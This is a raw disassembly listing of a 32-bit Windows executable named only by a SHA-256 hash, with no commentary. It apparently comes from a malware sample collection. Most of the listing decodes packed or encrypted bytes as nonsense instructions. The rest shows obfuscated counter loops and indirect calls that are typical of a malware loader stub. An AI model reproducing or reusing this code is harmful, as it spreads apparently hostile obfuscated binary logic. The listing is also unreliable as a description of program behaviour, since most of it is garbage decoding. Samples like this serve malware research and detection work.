
be9c801cb4bb90daec5966dd372e223e576bfc89f37272a360fe7f3cb2bfd248.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0x9ab3418c
  40101f:	inc    edi
  401020:	jle    0x4010a0
  401022:	jle    0x4010a2
  401024:	cwde   
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	rol    eax,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	push   cs
  401035:	ja     0x401037
  401037:	rdpmc  
  401039:	xadd   BYTE PTR [eax],bl
  40103c:	(bad)  
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0x5b0b59f
  4010d2:	retf   
  4010d3:	jle    0x4010b6
  4010d5:	dec    ebx
  4010d6:	push   DWORD PTR [edi]
  4010d8:	mov    esp,0x6734e956
  4010dd:	add    DWORD PTR [esi+0x35578e7a],ebx
  4010e3:	bound  ebx,QWORD PTR [esi+0x18]
  4010e6:	lods   al,BYTE PTR ds:[esi]
  4010e7:	jg     0x4010d3
  4010e9:	aas    
  4010ea:	or     al,BYTE PTR [ebx]
  4010ec:	shl    BYTE PTR [edx+eiz*8-0x53],cl
  4010f0:	nop
  4010f1:	in     eax,dx
  4010f2:	test   DWORD PTR [esi-0x17f57fb4],0xf98a4e5b
  4010fc:	jb     0x40110b
  4010fe:	pop    ebp
  4010ff:	jg     0x401091
  401101:	mov    esp,0x644efd28
  401106:	inc    edx
  401107:	mov    ?,ecx
  401109:	jmp    0x52db:0xebc6b88b
  401110:	(bad)  [ebp-0x5e8c8479]
  401116:	or     esp,DWORD PTR [edi+0x71]
  401119:	push   cs
  40111a:	cmc    
  40111b:	aas    
  40111c:	jbe    0x4010ce
  40111e:	loop   0x401115
  401120:	sbb    bl,BYTE PTR [ebx+0x356ecdf]
  401126:	sar    BYTE PTR [ebx],1
  401128:	add    dl,BYTE PTR [ecx-0x3ddd68d7]
  40112e:	repnz outs dx,BYTE PTR ds:[esi]
  401130:	cld    
  401131:	sar    DWORD PTR [edi+ebx*4],1
  401134:	cmp    bl,BYTE PTR [eax-0x10]
  401137:	xchg   esi,eax
  401138:	cmp    DWORD PTR [ebx+0x4c],edi
  40113b:	fstp   QWORD PTR [esi+edx*4-0x4]
  40113f:	mov    bl,0xb2
  401141:	cmc    
  401142:	(bad)  
  401143:	sub    dh,bl
  401145:	icebp  
  401146:	xlat   BYTE PTR ds:[ebx]
  401147:	jbe    0x40113f
  401149:	push   0x80e76c3
  40114e:	pop    ds
  40114f:	and    eax,0x2ce177c0
  401154:	or     eax,0x588b7973
  401159:	mov    DWORD PTR [esi],ecx
  40115b:	cmp    al,0xf8
  40115d:	stc    
  40115e:	xchg   esi,eax
  40115f:	xor    eax,DWORD PTR [ecx]
  401161:	and    ebp,DWORD PTR [edi]
  401163:	jo     0x40117c
  401165:	stos   DWORD PTR es:[edi],eax
  401166:	cmp    al,0xab
  401168:	xor    eax,0x5d71d11e
  40116d:	scas   al,BYTE PTR es:[edi]
  40116e:	and    BYTE PTR [ebx-0x28],bl
  401171:	xchg   BYTE PTR [edi],dh
  401173:	sbb    al,0x33
  401175:	adc    BYTE PTR [ecx-0x74],dh
  401178:	and    bh,BYTE PTR [ebp+ebx*2+0x7]
  40117c:	xor    DWORD PTR [ecx+0x6a],edi
  40117f:	lds    eax,FWORD PTR [eax-0x7b]
  401182:	and    al,0x74
  401184:	inc    edi
  401185:	out    dx,al
  401186:	mov    DWORD PTR [edi],esp
  401188:	pop    ebp
  401189:	cs push ds
  40118b:	or     esp,esp
  40118d:	aam    0xb2
  40118f:	push   esp
  401190:	add    eax,edi
  401192:	mov    ch,0xb0
  401194:	pop    eax
  401195:	mov    eax,0xf00df5fb
  40119a:	inc    ebp
  40119b:	mov    bh,0x8a
  40119d:	bound  ecx,QWORD PTR [eax]
  40119f:	mov    DWORD PTR [ebp+0x681655f3],edi
  4011a5:	jno    0x40113c
  4011a7:	test   eax,0x4bbe5a0e
  4011ac:	fst    DWORD PTR [ecx-0x35957c3b]
  4011b2:	push   edi
  4011b3:	dec    eax
  4011b4:	pop    ebx
  4011b5:	or     cl,dl
  4011b7:	adc    al,0xa5
  4011b9:	jl     0x401166
  4011bb:	jb     0x401145
  4011bd:	fstp   TBYTE PTR [edx]
  4011bf:	and    DWORD PTR [ecx+0x2bd69e9e],esi
  4011c5:	add    eax,0xe0d7a669
  4011ca:	pop    ss
  4011cb:	in     eax,dx
  4011cc:	sbb    DWORD PTR [ebx],0xb9e04589
  4011d2:	cmp    bl,BYTE PTR [ebp+0x0]
  4011d5:	add    BYTE PTR [ebx+0x45c7e04d],cl
  4011db:	fadd   st(1),st
  4011dd:	dec    esi
  4011de:	add    BYTE PTR [eax],al
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x4302d5,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x4302d5
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x4302d5,ecx
  401209:	cmp    DWORD PTR ds:0x4302d5,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ea8b
  401248:	cmp    DWORD PTR ds:0x4302d5,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x4302d5
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x4302d5,ecx
  401262:	cmp    DWORD PTR ds:0x4302d5,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x4302cd,0x1e
  401279:	cmp    DWORD PTR ds:0x4302cd,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x4302cd,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e827
  40129c:	mov    ecx,DWORD PTR ds:0x4302cd
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x4302cd,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx-0xa04df03]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x4012bf
  4012cc:	mov    al,ds:0x73cc3fb2
  4012d1:	loop   0x40128e
  4012d3:	out    0xa5,al
  4012d5:	xchg   ebp,eax
  4012d6:	ja     0x401304
  4012d8:	cmp    al,0x37
  4012da:	dec    ebp
  4012db:	pop    edi
  4012dc:	cmp    bl,BYTE PTR ds:0x9ea86134
  4012e2:	mov    al,ds:0x3024e02c
  4012e7:	cmp    edx,DWORD PTR [edi-0x5bef32f9]
  4012ed:	mov    bh,0x65
  4012ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012f0:	int3   
  4012f1:	pop    ebx
  4012f2:	arpl   WORD PTR [eax+0x30],di
  4012f5:	in     eax,dx
  4012f6:	adc    BYTE PTR [ebp+0x1e],0x2e
  4012fa:	iret   
  4012fb:	dec    ebp
  4012fc:	cwde   
  4012fd:	or     al,0x96
  4012ff:	xor    al,0xba
  401301:	repz sub DWORD PTR [edx+0x4a],esp
  401305:	call   0x5cb01724
  40130a:	mov    ah,0x35
  40130c:	xchg   DWORD PTR [ebx],esi
  40130e:	mov    al,ds:0xf8c531cf
  401313:	icebp  
  401314:	mov    BYTE PTR [eax+0x14],dh
  401317:	push   0x32
  401319:	adc    ebp,DWORD PTR [ebx+edx*4-0x12f39f1c]
  401320:	mul    edi
  401322:	ret    
  401323:	(bad)  
  401324:	idiv   edi
  401326:	das    
  401327:	mov    esp,DWORD PTR [ebp+0x2]
  40132a:	sbb    eax,0xbff12e1d
  40132f:	or     al,0x9f
  401331:	sub    eax,0xc3854566
  401336:	jb     0x4012b8
  401338:	out    0x35,eax
  40133a:	rcl    DWORD PTR [ecx+0x4b],cl
  40133d:	mov    ds:0xd14c5815,eax
  401342:	push   esp
  401343:	inc    esi
  401344:	pusha  
  401345:	fsub   DWORD PTR [ebx+ecx*4+0x6e20b016]
  40134c:	jge    0x4012f7
  40134e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40134f:	js     0x401312
  401351:	std    
  401352:	or     edi,ebx
  401354:	retf   0x1ed3
  401357:	fidiv  WORD PTR [ecx+0x21dd9341]
  40135d:	sub    eax,0xb486a531
  401362:	dec    esp
  401363:	scas   al,BYTE PTR es:[edi]
  401364:	lods   al,BYTE PTR ds:[esi]
  401365:	cmp    BYTE PTR [edx+0x2638e2bd],bl
  40136b:	xchg   BYTE PTR [ecx+0x325bb21f],cl
  401371:	cmp    eax,0x5f9af21c
  401376:	add    DWORD PTR [eax+0x2f9ef196],esp
  40137c:	mov    ch,0x14
  40137e:	jp     0x4013a6
  401380:	xchg   edx,eax
  401381:	popa   
  401382:	stos   BYTE PTR es:[edi],al
  401383:	rol    DWORD PTR [ecx-0x760b43c],0x7b
  40138a:	cmp    DWORD PTR [ecx+eiz*2],ebp
  40138d:	push   ds
  40138e:	jne    0x40138d
  401390:	fld    st(6)
  401392:	mov    edi,0x4c9ff78b
  401397:	adc    al,0x4d
  40139a:	(bad)
  40139d:	inc    edx
  40139e:	aaa    
  40139f:	scas   al,BYTE PTR es:[edi]
  4013a0:	pop    es
  4013a1:	xchg   esi,eax
  4013a2:	out    dx,al
  4013a3:	call   0xd0f902e7
  4013a8:	cli    
  4013a9:	std    
  4013aa:	xchg   BYTE PTR [ebp+0x1dba26ab],cl
  4013b0:	pushf  
  4013b1:	shl    DWORD PTR [esi],1
  4013b3:	jbe    0x40134b
  4013b5:	mov    BYTE PTR [ecx],al
  4013b7:	into   
  4013b8:	je     0x40134b
  4013ba:	or     bl,BYTE PTR [ebp+0x7f]
  4013bd:	or     dl,dl
  4013bf:	and    al,0x40
  4013c1:	mov    eax,0xbc43cd71
  4013c6:	outs   dx,BYTE PTR ds:[esi]
  4013c7:	add    BYTE PTR [esi+0x74],bh
  4013ca:	cmp    BYTE PTR [ebx-0x416e3472],bl
  4013d0:	jg     0x40139c
  4013d2:	ja     0x4013a2
  4013d4:	adc    al,0x7b
  4013d6:	data16 jl 0x40140d
  4013d9:	scas   eax,DWORD PTR es:[edi]
  4013da:	enter  0xd410,0x8
  4013de:	jns    0x4013dc
  4013e0:	sbb    eax,0x29078ec7
  4013e5:	(bad)  
  4013e6:	lods   eax,DWORD PTR ds:[esi]
  4013e7:	pop    ds
  4013e8:	mov    ?,WORD PTR [esi]
  4013ea:	ror    BYTE PTR [ebp-0xc6125e9],1
  4013f0:	ror    DWORD PTR [eax],0x86
  4013f3:	test   DWORD PTR ds:[ebx-0xd],edx
  4013f7:	sub    esi,ecx
  4013f9:	push   ebp
  4013fa:	mov    eax,es
  4013fc:	nop
  4013fd:	lods   eax,DWORD PTR ds:[esi]
  4013fe:	es ffree st(0)
  401401:	call   0xc7f5:0x8eef0405
  401408:	xor    BYTE PTR [edi],bh
  40140a:	mov    ch,0x13
  40140c:	icebp  
  40140d:	jne    0x4013d6
  40140f:	sbb    ebp,edi
  401411:	(bad)  
  401412:	scas   eax,DWORD PTR es:[edi]
  401413:	sub    ebx,ebx
  401415:	and    al,0x3d
  401417:	dec    edi
  401418:	ds stos DWORD PTR es:[edi],eax
  40141a:	arpl   WORD PTR [edx-0x68],bp
  40141d:	xchg   edx,eax
  40141e:	jnp    0x40141c
  401420:	fwait
  401421:	push   cs
  401422:	and    ch,0xeb
  401425:	cdq    
  401426:	in     al,dx
  401427:	es pusha 
  401429:	pushf  
  40142a:	in     al,0x7c
  40142c:	mov    dh,0x4b
  40142e:	and    al,0xd7
  401430:	mov    al,ds:0xf3b67e85
  401436:	sbb    eax,0xec977e9c
  40143b:	out    0x3e,eax
  40143d:	in     al,0x9c
  40143f:	cld    
  401440:	loope  0x40141c
  401442:	sbb    ah,BYTE PTR [ebp+0x69]
  401445:	leave  
  401446:	sbb    edi,ebx
  401448:	rcr    DWORD PTR [ebp+0x462fe912],0x2
  40144f:	ret    0x6057
  401452:	sub    eax,0x36347644
  401457:	(bad)  
  401459:	lahf   
  40145a:	lods   al,BYTE PTR ds:[esi]
  40145b:	jno    0x401474
  40145d:	pop    ds
  40145e:	pop    edx
  40145f:	pop    ecx
  401460:	jns    0x4013e4
  401462:	int3   
  401463:	repz stc 
  401465:	bnd ret 
  401467:	jno    0x401408
  401469:	cmp    cl,BYTE PTR [ecx+0x36]
  40146c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146d:	fsubr  QWORD PTR [ebx+0x2a]
  401470:	pop    esi
  401471:	push   esi
  401472:	mov    ecx,0x8a3c
  401477:	adc    DWORD PTR ds:0x42ec5b,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x4302b9
  40148b:	or     DWORD PTR ds:0x43036b,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x63010fff
  4014a7:	add    ebx,DWORD PTR [eax+0x7e7e7dc2]
  4014ad:	cwde   
  4014ae:	jg     0x40152e
  4014b0:	jle    0x40145f
  4014b2:	add    eax,DWORD PTR [ecx-0x60]
  4014b5:	add    DWORD PTR [edi-0x38624e50],0xd78a387a
  4014bf:	mov    gs:0xc7a2e670,al
  4014c5:	push   ss
  4014c6:	leave  
  4014c7:	daa    
  4014c8:	out    dx,eax
  4014c9:	mov    ah,0x59
  4014cb:	and    eax,0x4abf17bd
  4014d0:	push   edi
  4014d1:	sub    ebx,DWORD PTR [ebx+0x6b]
  4014d4:	pop    ebx
  4014d5:	call   0xa71e:0x31433784
  4014dc:	call   0xe144:0x50699e00
  4014e3:	xchg   edx,eax
  4014e4:	test   al,0x96
  4014e6:	(bad)  
  4014e7:	in     eax,dx
  4014e8:	bt     DWORD PTR [ebx+eax*1],ebx
  4014ec:	into   
  4014ed:	paddusw mm7,QWORD PTR [ebp-0x12]
  4014f1:	int3   
  4014f2:	adc    BYTE PTR [esi],0xfb
  4014f5:	add    DWORD PTR [edi-0x27fd94f9],ecx
  4014fb:	loope  0x40153f
  4014fd:	xchg   esp,eax
  4014fe:	adc    ebx,DWORD PTR [edx-0x2c5b6c71]
  401504:	xor    ah,BYTE PTR [edi-0x6ae5984f]
  40150a:	sub    dh,BYTE PTR [edx-0x34]
  40150d:	xchg   edx,eax
  40150e:	push   esp
  40150f:	sub    BYTE PTR [ebx+0x1e],ch
  401512:	sbb    ebp,DWORD PTR [edi+ebp*8]
  401515:	ret    
  401516:	cmp    edx,0x2f
  401519:	pushf  
  40151a:	dec    ebx
  40151b:	cmp    dl,dl
  40151d:	sub    al,0xea
  40151f:	adc    dl,BYTE PTR [esi-0x41f9959d]
  401525:	ins    DWORD PTR es:[edi],dx
  401526:	aad    0x86
  401528:	adc    eax,0xff042752
  40152d:	sahf   
  40152e:	test   eax,0xe5fe3557
  401533:	sbb    eax,DWORD PTR [esp+ebx*2+0x75]
  401537:	leave  
  401538:	pop    esp
  401539:	int3   
  40153a:	and    edi,ecx
  40153c:	fld    TBYTE PTR [ecx]
  40153e:	test   al,0x98
  401540:	cdq    
  401541:	jns    0x401592
  401543:	cli    
  401544:	call   0x29ab:0xa05716d2
  40154b:	bound  ebp,QWORD PTR ds:0x8b83ec1f
  401551:	bound  edx,QWORD PTR [ebp+0x21]
  401554:	out    0xd2,al
  401556:	bound  ebp,QWORD PTR [ebx+0x19396b56]
  40155c:	not    BYTE PTR [eax-0x4]
  40155f:	dec    esi
  401560:	stos   DWORD PTR es:[edi],eax
  401561:	pop    ss
  401562:	outs   dx,DWORD PTR ds:[esi]
  401563:	shl    DWORD PTR [ebp+0x4b],cl
  401566:	xchg   edi,eax
  401567:	push   es
  401568:	or     BYTE PTR [eax-0x43],cl
  40156b:	cmc    
  40156c:	call   0xae02:0x41cb1708
  401573:	ss cmp eax,0xd542e648
  401579:	and    eax,0x338363c7
  40157e:	int3   
  40157f:	fbld   TBYTE PTR ds:0xdbd0e360
  401585:	call   DWORD PTR [eax]
  401587:	ins    DWORD PTR es:[edi],dx
  401588:	mov    al,0x52
  40158a:	pop    esi
  40158b:	cmc    
  40158c:	xchg   DWORD PTR [ebx+0x2ad2a0e0],edx
  401592:	and    dl,bh
  401594:	mov    ds:0xb0d6fb9e,eax
  401599:	xchg   esi,eax
  40159a:	add    BYTE PTR [edi+0x6c70d911],dl
  4015a0:	int3   
  4015a1:	add    al,0xb1
  4015a3:	in     eax,dx
  4015a4:	sar    BYTE PTR [esi-0x1216ed02],cl
  4015aa:	icebp  
  4015ab:	cmc    
  4015ac:	inc    esi
  4015ad:	xchg   edi,eax
  4015ae:	jl     0x401612
  4015b0:	xchg   ecx,eax
  4015b1:	lods   al,BYTE PTR ds:[esi]
  4015b2:	add    ebx,DWORD PTR [edi-0x64]
  4015b5:	pop    ds
  4015b6:	(bad)  
  4015b7:	mov    ch,0xa8
  4015b9:	and    dl,BYTE PTR [esi+0x57]
  4015bc:	mov    al,0xa4
  4015be:	mov    ds:0x433f06d2,eax
  4015c3:	lock loope 0x401612
  4015c6:	arpl   WORD PTR [esi+ebx*4],cx
  4015c9:	mov    eax,0xcdd382a
  4015ce:	xchg   edx,eax
  4015cf:	lds    ebx,FWORD PTR ds:0x40e2de08
  4015d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015d6:	sub    DWORD PTR [ecx+eax*8+0x62],0xffffff8b
  4015db:	idiv   BYTE PTR ds:0xfbcdb8b7
  4015e2:	ins    BYTE PTR es:[edi],dx
  4015e3:	call   0x9ec0bb6a
  4015e8:	sbb    ecx,DWORD PTR [ebp+0x2187a740]
  4015ee:	mov    eax,0x60d9ab31
  4015f3:	out    0x1b,eax
  4015f5:	jge    0x401666
  4015f7:	push   cs
  4015f8:	mov    eax,ds:0x94ef57c5
  4015fd:	xlat   BYTE PTR ds:[ebx]
  4015fe:	scas   al,BYTE PTR es:[edi]
  4015ff:	(bad)  
  401601:	mov    edi,0x44e48067
  401606:	aad    0x3a
  401608:	sub    DWORD PTR ds:0xcc7cc9c6,edi
  40160e:	jle    0x4015f9
  401610:	dec    ebp
  401611:	push   edi
  401612:	pop    eax
  401613:	pop    es
  401614:	mov    bh,BYTE PTR ds:0x316650ac
  40161a:	jecxz  0x401688
  40161c:	ins    DWORD PTR es:[edi],dx
  40161d:	add    al,0x99
  40161f:	xchg   esi,eax
  401620:	mov    al,0x84
  401622:	fcmovb st,st(2)
  401624:	(bad)  
  401625:	and    eax,0xbe8fac38
  40162a:	and    al,0xa4
  40162c:	pop    eax
  40162d:	jbe    0x401694
  40162f:	cdq    
  401630:	mov    eax,ds:0x92ea4c00
  401635:	cmp    eax,0x9fdf758a
  40163a:	mov    eax,ds:0xa2b23b5b
  40163f:	mov    eax,ds:0xbe11a5e
  401644:	sbb    al,0x76
  401646:	lods   eax,DWORD PTR ds:[esi]
  401647:	lods   eax,DWORD PTR ds:[esi]
  401648:	or     ah,BYTE PTR [ebp+0x6e]
  40164b:	add    DWORD PTR [ebp+0x1b],edi
  40164e:	jmp    0x401627
  401650:	call   0xf46f4e2d
  401655:	ins    BYTE PTR es:[edi],dx
  401656:	outs   dx,DWORD PTR ds:[esi]
  401657:	push   edi
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	pop    es
  40166c:	jns    0x4015f6
  40166e:	jo     0x4016dc
  401670:	jp     0x4016f0
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x401649
  401678:	cwde   
  401679:	inc    edx
  40167a:	adc    BYTE PTR [eax-0x7c8c4928],dl
  401680:	xor    cl,BYTE PTR [edx]
  401682:	mov    eax,0xebb3929e
  401687:	not    DWORD PTR [esi+0x61]
  40168a:	lods   eax,DWORD PTR ds:[esi]
  40168b:	push   esi
  40168c:	add    ecx,DWORD PTR [ecx+0x1]
  40168f:	out    0xc3,eax
  401691:	jae    0x4016d5
  401693:	xchg   ebp,esi
  401695:	and    esi,edx
  401697:	pop    ds
  401698:	cwde   
  401699:	xor    DWORD PTR [ebx-0x3f],edi
  40169c:	nop
  40169d:	lea    edx,[esi]
  40169f:	iret   
  4016a0:	pop    ebp
  4016a1:	mov    eax,ds:0xc56aa4dd
  4016a6:	adc    DWORD PTR [esi],ecx
  4016a8:	loope  0x401677
  4016aa:	push   edi
  4016ab:	and    dh,cl
  4016ad:	xchg   ecx,eax
  4016ae:	jle    0x4016a0
  4016b0:	fnsetpm(287 only) 
  4016b2:	pop    eax
  4016b3:	outs   dx,BYTE PTR ds:[si]
  4016b5:	adc    DWORD PTR [ebx-0x51],0x35
  4016b9:	out    0x20,al
  4016bb:	sbb    esp,edx
  4016bd:	fstp   TBYTE PTR [ebx+0x47]
  4016c0:	inc    edx
  4016c1:	sar    DWORD PTR [esi],cl
  4016c3:	(bad)  
  4016c4:	stc    
  4016c5:	rol    ecx,cl
  4016c7:	cmc    
  4016c8:	push   cs
  4016c9:	mov    eax,0xe6e140c9
  4016ce:	pop    esp
  4016cf:	mov    cl,0x62
  4016d1:	mov    esp,0x3bc43f88
  4016d6:	fs gs enter 0x4d0e,0xe5
  4016dc:	mov    eax,0xe50e8215
  4016e1:	sub    BYTE PTR [esi+0xf6889c6],cl
  4016e7:	test   ebp,edx
  4016e9:	mov    dl,dl
  4016eb:	jbe    0x401734
  4016ed:	cli    
  4016ee:	dec    edi
  4016ef:	inc    esp
  4016f0:	fldcw  WORD PTR [esi+esi*2+0x21]
  4016f4:	ds repz loopne 0x4016d6
  4016f8:	or     esp,DWORD PTR [edx]
  4016fa:	lock neg BYTE PTR [eax-0x30345aa3]
  401701:	mov    dl,0x3f
  401703:	sti    
  401704:	(bad)  
  401705:	imul   edi,DWORD PTR ds:0xec142af0,0xfffffff5
  40170c:	mov    ebx,0xc8f32b4a
  401711:	mov    edi,0x8771f11e
  401716:	test   eax,0x3510d19f
  40171b:	loop   0x401720
  40171d:	xchg   esp,eax
  40171e:	or     eax,ecx
  401720:	pop    ecx
  401721:	sahf   
  401722:	retf   
  401723:	dec    edx
  401724:	das    
  401725:	push   ss
  401726:	repnz add al,0x97
  401729:	ja     0x40172d
  40172b:	std    
  40172c:	ds jne 0x401706
  40172f:	add    ah,BYTE PTR [eax-0x50]
  401732:	mov    ds:0x906088b3,eax
  401737:	jg     0x4016ca
  401739:	mov    edi,0xb4673ea2
  40173e:	push   ss
  40173f:	push   es
  401740:	fild   DWORD PTR [ecx-0x4b19bec]
  401746:	repnz pop edx
  401748:	sar    BYTE PTR [edx-0xad533cc],cl
  40174e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40174f:	ds jg  0x4016f5
  401752:	xor    al,0x78
  401754:	lahf   
  401755:	push   cs
  401756:	repnz iret 
  401758:	mul    BYTE PTR [edx+ebp*1+0x6050aa5d]
  40175f:	je     0x4016ef
  401761:	(bad)  
  401762:	out    0xd9,eax
  401764:	push   es
  401765:	test   eax,0x166b46c2
  40176a:	fs leave 
  40176c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40176d:	mov    al,0x6b
  40176f:	out    dx,eax
  401770:	xlat   BYTE PTR ds:[ebx]
  401771:	mov    edi,0x6286ea75
  401776:	aam    0xff
  401778:	sti    
  401779:	pop    ebp
  40177a:	mov    dh,0x45
  40177c:	fiadd  WORD PTR [ebp-0x7f12f32f]
  401782:	test   eax,0xcf5d9b50
  401787:	ss jmp 0x5d8f:0x980e6cbf
  40178f:	sub    eax,0xcdf1a8
  401794:	idiv   dl
  401796:	inc    edx
  401797:	sbb    al,0xcc
  401799:	push   cs
  40179a:	call   0xefaa04da
  40179f:	popf   
  4017a0:	std    
  4017a1:	or     DWORD PTR [ecx],0x6fddbc47
  4017a7:	inc    edx
  4017a8:	arpl   bx,cx
  4017aa:	cs mov ecx,0x936a331c
  4017b0:	stc    
  4017b1:	dec    esi
  4017b2:	das    
  4017b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017b4:	add    al,0x9a
  4017b6:	lods   eax,DWORD PTR ds:[esi]
  4017b7:	stos   BYTE PTR es:[edi],al
  4017b8:	jecxz  0x401758
  4017ba:	xor    eax,0x42bbe959
  4017bf:	ins    BYTE PTR es:[edi],dx
  4017c0:	in     eax,0x64
  4017c2:	test   eax,0x4e627141
  4017c7:	xchg   ebx,eax
  4017c8:	xchg   esp,eax
  4017c9:	push   esi
  4017ca:	fmul   DWORD PTR [edx+0x42d61174]
  4017d0:	adc    esp,DWORD PTR [esi-0x5f2fc727]
  4017d6:	bound  esp,QWORD PTR [ebx+edi*2-0x72be5c8]
  4017dd:	les    edi,FWORD PTR [edx+0x6c]
  4017e0:	mov    ch,0x3e
  4017e2:	adc    DWORD PTR [ebp+ecx*4+0x35],ebx
  4017e6:	shr    BYTE PTR [ecx],1
  4017e8:	xchg   ebx,eax
  4017e9:	push   ebp
  4017ea:	pop    esp
  4017eb:	dec    ecx
  4017ec:	test   DWORD PTR [edx],ebx
  4017ee:	sti    
  4017ef:	aad    0xec
  4017f1:	push   ss
  4017f2:	cmp    al,0x8a
  4017f4:	das    
  4017f5:	imul   DWORD PTR ds:0xd408bc95
  4017fb:	pushf  
  4017fc:	mov    dl,BYTE PTR [edx+eiz*1]
  4017ff:	xchg   ecx,eax
  401800:	out    dx,eax
  401801:	cli    
  401802:	adc    bl,0x5a
  401805:	inc    eax
  401806:	pop    ds
  401807:	dec    ebx
  401808:	dec    BYTE PTR [ebx+0xe]
  40180b:	iret   
  40180c:	push   eax
  40180d:	jnp    0x40179b
  40180f:	jns    0x4017a2
  401811:	adc    DWORD PTR [edx-0x5a],esi
  401814:	shr    DWORD PTR [esi],1
  401816:	jl     0x401815
  401818:	fdivr  DWORD PTR ds:[esi]
  40181b:	stos   BYTE PTR es:[edi],al
  40181c:	jmp    0x4017dd
  40181e:	add    bh,BYTE PTR [ebx]
  401820:	add    BYTE PTR [eax],al
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x4302d5,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x4302d9,0x0
  40183c:	mov    esi,DWORD PTR ds:0x4302d9
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x4302d9,esi
  401849:	cmp    DWORD PTR ds:0x4302d9,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
